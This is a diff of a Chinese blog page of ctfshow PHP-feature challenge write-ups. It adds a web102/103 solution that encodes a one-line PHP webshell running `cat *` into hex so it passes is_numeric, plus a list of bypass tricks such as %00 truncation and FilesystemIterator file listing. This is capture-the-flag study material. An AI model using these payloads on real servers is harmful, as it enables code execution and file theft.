@@ -465,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    2k
                 </div>
                 
 
@@ -762,7 +762,7 @@ v2<span class="token operator">=</span>var_dump
 v2<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102,103"></a>web102,103</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -779,17 +779,22 @@ v2<span class="token operator">=</span><span class="token function">var_dump</sp
 <span class="token punctuation">&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>首先，is_numeric是可以识别16进制的，所以我们可以传入16进制数绕过v4。substr的意思为取第2的字符之后的字符串，所以取完之后s为一串16进制数。v1我们可以取hex2bin使其转换为字符串。这样我们就可以写入了一句话木马。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+$a='&lt;?=`cat *`;';
+$b=base64_encode($a);  // PD89YGNhdCAqYDs=
+$c=bin2hex($b);      //这里直接用去掉=的base64
+输出   5044383959474e6864434171594473
+
+带e的话会被认为是科学计数法，可以通过is_numeric检测。
+大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: Firebasky
-# @Date:   2020-09-16 11:25:09
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-28 22:34:07
 
-*/</span>
 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -815,7 +820,7 @@ v2<span class="token operator">=</span><span class="token function">var_dump</sp
 
 <span class="token delimiter important">?></span></span>
 你还想要flag嘛？
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们自后向前分析。</p>
 <p>我哦们可以通过$erro或者$suces来输出flag。只要使他们等于$flag即可。</p>
@@ -959,6 +964,22 @@ getcwd — 取得当前工作目录
 
 <p>payload为?v1=FilesystemIterator&amp;v2=getcwd</p>
 <p>当然了，我们只能获得文件名。如果文件是php文件，我们可就没办法了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>绕过强类型对比之类的可以使用加空格的方式进行绕过，数字我们可以使用8进制，16进制。</p>
+</li>
+<li><p>双$的使用，比如$$a == &gt;$violet。也就是说$$a实际指的是变量名为变量a所指向的变量值。</p>
+</li>
+<li><p>遇到过滤我们想要得到的文件名时，可以使用路径获取。同时可以使用FilesystemIterator与getcwd结合获得文件名信息。（web110）</p>
+</li>
+<li><p>反射类的使用，我们可以使用反射类来输出类的详细信息。（web100）Reflection</p>
+</li>
+<li><p>hex2bin的使用。（web102,103）</p>
+</li>
+<li><p>hash的绕过。</p>
+</li>
+<li><p>ereg的绕过，可以使用%00截断。</p>
+</li>
+</ol>
 
                 
             </div>
@@ -1204,9 +1225,9 @@ getcwd — 取得当前工作目录
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="ctfshowPHP特性-中">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="ctfshowPHP特性-中(111-131)">
                         
-                        <span class="card-title">ctfshowPHP特性-中</span>
+                        <span class="card-title">ctfshowPHP特性-中(111-131)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1221,11 +1242,27 @@ getcwd — 取得当前工作目录
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Violet
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1466,7 +1503,7 @@ getcwd — 取得当前工作目录
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">52.9k</span>
+                        class="white-color">72.7k</span>
             
             
             
